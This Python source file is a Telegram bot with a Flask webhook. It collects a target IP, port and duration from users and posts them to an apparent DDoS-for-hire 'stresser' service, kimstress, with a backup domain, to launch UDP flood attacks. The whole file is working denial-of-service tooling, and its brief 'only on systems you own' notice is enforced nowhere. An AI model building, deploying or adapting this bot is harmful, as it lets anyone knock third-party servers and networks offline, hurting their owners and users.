import os
import requests
import logging
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import (
    Updater,
    CommandHandler,
    MessageHandler,
    Filters,
    ConversationHandler
)

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
KIMSTRESS_TOKEN = os.environ.get("KIMSTRESS_TOKEN")
KIMSTRESS_API_URL = "https://kimstress.st/attack"
# =================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT, DURATION = range(3)

# Create Flask app
app = Flask(__name__)

# Check if tokens are set
if not TELEGRAM_BOT_TOKEN:
    logger.error("TELEGRAM_BOT_TOKEN environment variable is not set!")
    exit(1)
if not KIMSTRESS_TOKEN:
    logger.error("KIMSTRESS_TOKEN environment variable is not set!")
    exit(1)

logger.info("Bot token loaded successfully")

# Initialize updater
updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

# ============= HANDLERS =============
def start(update, context):
    update.message.reply_text(
        "🔥 *KIMSTRESS Attack Bot* 🔥\n\n"
        "Send /attack to start an attack.\n"
        "⚠️ Use responsibly and only on systems you own.",
        parse_mode="Markdown"
    )

def attack(update, context):
    update.message.reply_text(
        "📡 Send the *IP address* (e.g., 1.2.3.4):",
        parse_mode="Markdown"
    )
    return IP

def get_ip(update, context):
    context.user_data['ip'] = update.message.text.strip()
    update.message.reply_text(
        "🔌 Send the *port number* (e.g., 80):",
        parse_mode="Markdown"
    )
    return PORT

def get_port(update, context):
    try:
        port = int(update.message.text.strip())
        context.user_data['port'] = port
    except ValueError:
        update.message.reply_text("❌ Invalid port. Send a number (e.g., 80):")
        return PORT
    update.message.reply_text(
        "⏱️ Send the *duration in seconds* (max 300 for free plan):",
        parse_mode="Markdown"
    )
    return DURATION

def get_duration(update, context):
    try:
        duration = int(update.message.text.strip())
        if duration > 300:
            update.message.reply_text("⚠️ Free plan max duration is 300 seconds. Using 300 instead.")
            duration = 300
        elif duration < 1:
            update.message.reply_text("❌ Duration must be at least 1 second.")
            return DURATION
        context.user_data['duration'] = duration
    except ValueError:
        update.message.reply_text("❌ Invalid number. Send a number (e.g., 60):")
        return DURATION

    # Prepare attack request
    ip = context.user_data['ip']
    port = context.user_data['port']
    dur = context.user_data['duration']

    update.message.reply_text(f"🚀 Sending attack to {ip}:{port} for {dur} seconds...")

    # Build API request
    headers = {
        "Authorization": f"Bearer {KIMSTRESS_TOKEN}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "address": ip,
        "port": port,
        "duration": dur,
        "method": "UDP-FREE",
        "concurrents": 1
    }

    try:
        resp = requests.post(KIMSTRESS_API_URL, data=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            update.message.reply_text("✅ Attack started successfully!")
        else:
            backup_url = "https://kimstress.com/attack"
            resp2 = requests.post(backup_url, data=payload, headers=headers, timeout=15)
            if resp2.status_code == 200:
                update.message.reply_text("✅ Attack started via backup domain!")
            else:
                update.message.reply_text(f"❌ Failed. Status: {resp.status_code}")
    except Exception as e:
        update.message.reply_text(f"⚠️ Error: {str(e)}")

    return ConversationHandler.END

def cancel(update, context):
    update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# Register handlers
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('attack', attack)],
    states={
        IP: [MessageHandler(Filters.text & ~Filters.command, get_ip)],
        PORT: [MessageHandler(Filters.text & ~Filters.command, get_port)],
        DURATION: [MessageHandler(Filters.text & ~Filters.command, get_duration)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

dispatcher.add_handler(CommandHandler('start', start))
dispatcher.add_handler(conv_handler)

# ============= WEBHOOK ENDPOINT =============
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), updater.bot)
        updater.dispatcher.process_update(update)
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.exception("Error processing webhook update")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/')
def index():
    return "Bot is running"

# ============= MAIN =============
if __name__ == '__main__':
    render_hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
    if render_hostname and TELEGRAM_BOT_TOKEN:
        webhook_url = f"https://{render_hostname}/webhook"
        logger.info(f"Setting webhook to: {webhook_url}")
        try:
            updater.bot.set_webhook(webhook_url)
            logger.info("Webhook set successfully")
        except Exception as e:
            logger.error(f"Failed to set webhook: {e}")
    else:
        logger.warning("RENDER_EXTERNAL_HOSTNAME not set or token missing")

    port = int(os.environ.get('PORT', 5000))
    logger.info(f"Starting Flask server on port {port}")
    app.run(host='0.0.0.0', port=port)